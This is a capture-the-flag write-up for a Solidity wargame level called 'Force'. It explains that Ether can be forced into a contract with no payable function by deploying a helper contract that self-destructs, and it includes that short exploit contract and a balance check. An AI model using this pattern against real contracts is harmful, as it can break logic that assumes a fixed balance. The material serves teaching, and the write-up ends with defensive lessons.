# Level 7: Force

## Challenge Overview

This challenge demonstrates how a smart contract can receive Ether even if it does not implement a `payable` function or fallback method.  
The goal is to force Ether into the contract by leveraging the `selfdestruct` function.

## Goal

- Force the `Force` contract to accept Ether.

## Solution

### 1. Understand the Issue

The `Force` contract does not contain any `payable` function or fallback function,  
so it cannot directly receive Ether through standard transactions.  
However, the `selfdestruct` function in Solidity allows a contract to send Ether to another address regardless of its code.

### 2. Deploy a Helper Contract

Create and deploy a helper contract with a `selfdestruct` function that will force Ether into the `Force` contract:

```solidity
contract ForceAttack {
    constructor(address payable _target) payable {
        selfdestruct(_target);
    }
}
```

### 3. Steps to Execute

- Call the constructor, which immediately triggers the `selfdestruct` function  
  and sends all the Ether to the `Force` contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract ForceAttack {
    constructor(address payable _force) payable {
        // As soon as this contract is created,
        // destroy it and send all its ETH to _force
        selfdestruct(_force);
    }
}
```

### 4. Verify the Balance

Confirm that the `Force` contract now holds the Ether:

```javascript
const bal = await getBalance(contract.address);
console.log("Force balance:", fromWei(bal), "ETH"); // > 0
```

---

## Lessons Learned

- Even if you don’t expose any payable entry points, Ether can still be forced into you.
- Always check `address(this).balance` dynamically rather than assuming no Ether can ever arrive.
- On EIP-6780 and future forks may further limit `selfdestruct` so keep an eye on upcoming upgrades.
